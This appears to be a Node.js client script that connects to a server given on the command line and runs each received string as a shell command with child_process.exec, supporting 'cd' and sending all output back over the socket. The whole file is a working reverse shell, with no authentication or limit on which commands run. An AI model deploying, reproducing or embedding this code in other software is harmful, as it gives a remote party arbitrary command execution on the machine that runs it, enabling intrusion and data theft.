const { Socket } = require("net");
const { exec } = require("child_process");
const { EventEmitter } = require("stream");
const { register, connect } = require("./setup");
const socket = new Socket();

// take port and host from command line arguments
const port = parseInt(process.argv[2]) || 3000;
const host = process.argv[3] || "localhost";

socket.connect(port, host, () => {
  console.log("Connected to server");
  //register(socket);
  connect(socket);
});

socket.on("data", (data) => {
  console.log("Received:", data.toString());
  let command = data.toString();
  let currentDirectory = process.cwd();
  if (command.startsWith("cd")) {
    console.log("Changing directory");

    const targetDirectory = command.slice(3).trim(); // Extract target directory
    process.chdir(targetDirectory); // Change directory locally
    currentDirectory = process.cwd(); // Update current directory
    socket.write(currentDirectory); // Send current directory back to the server
  } else {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.log(`error: ${error.message}`);
        socket.write(error.message);
        return;
      }
      if (stderr) {
        console.log(`stderr: ${stderr}`);
        socket.write(stderr);
        return;
      }
      //console.log(`stdout: ${stdout}`);
      socket.write(stdout);
    });
  }
});
